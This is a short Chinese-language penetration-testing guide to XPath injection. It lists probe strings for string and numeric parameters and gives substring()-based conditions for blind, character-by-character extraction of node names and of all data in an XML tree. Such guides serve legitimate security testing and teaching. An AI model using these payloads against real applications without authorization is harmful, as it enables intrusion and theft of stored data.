# 注入XPath

**渗透测试步骤：**

(1) 尝试提交下面的值，并确定它们是否会导致应用程序的行为发生改变，但是不会造成错误：

    ' or count(parent::*[position()=1])=0 or 'a'='b
    ' or count(parent::*[position()=1])>0 or 'a'='b

如果参数为数字，尝试提交下面的测试字符串：

    1 or count(parent::*[position()=1])=0
    1 or count(parent::*[position()=1])>0

(2) 如果上面的任何字符串导致应用程序的行为发生改变，但是不会造成错误，很可能通过设计测试条件，一次提取一个字节信息，从而获取任意数据。使用一系列以下格式的条件确定当前节点的父节点的名称：

    substring(name(parent::*[position()=1]),1,1)='a'

(3) 提取出父节点的名称后，使用一系列下面格式的条件提取XML树中的所有数据：

    substring(//parentnodename[position()=1]/child::node()[position()=1]/text(),1,1)='a'

